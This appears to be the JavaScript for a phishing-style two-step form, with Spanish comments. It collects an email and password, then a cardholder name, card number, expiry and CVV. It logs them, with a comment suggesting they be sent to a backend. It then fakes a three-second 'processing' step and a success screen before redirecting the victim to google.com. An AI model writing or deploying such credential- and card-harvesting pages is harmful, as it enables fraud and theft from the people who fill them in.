document.addEventListener('DOMContentLoaded', () => {
    
    const step1 = document.getElementById('step1');
    const step2 = document.getElementById('step2');
    const loader = document.getElementById('loader');
    const success = document.getElementById('success');

    // Paso 1: Email y Password
    step1.addEventListener('submit', (e) => {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        
        // Aquí puedes agregar la lógica para enviar a tu backend
        console.log("Credenciales:", email, password);

        // Transición suave
        step1.classList.remove('active');
        setTimeout(() => {
            step2.classList.add('active');
        }, 200);
    });

    // Paso 2: Tarjeta
    step2.addEventListener('submit', (e) => {
        e.preventDefault();

        // Capturar datos de tarjeta
        const cardData = {
            name: document.getElementById('cardName').value,
            number: document.getElementById('cardNumber').value,
            expiry: document.getElementById('cardExpiry').value,
            cvv: document.getElementById('cardCvv').value
        };
        console.log("Datos Tarjeta:", cardData);

        // Mostrar loader
        step2.classList.remove('active');
        loader.classList.add('active');

        // 3 segundos de "procesando"
        setTimeout(() => {
            loader.classList.remove('active');
            success.classList.add('active');

            // 2 segundos después, redirigir a Google
            setTimeout(() => {
                window.location.href = "https://www.google.com";
            }, 2000);

        }, 3000);
    });

    // Formato automático: Número de tarjeta (espacios)
    const cardInput = document.getElementById('cardNumber');
    cardInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
        let formattedValue = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) formattedValue += ' ';
            formattedValue += value[i];
        }
        e.target.value = formattedValue;
    });

    // Formato automático: Fecha (barra)
    const expiryInput = document.getElementById('cardExpiry');
    expiryInput.addEventListener('input', (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2);
        }
        e.target.value = value;
    });
});
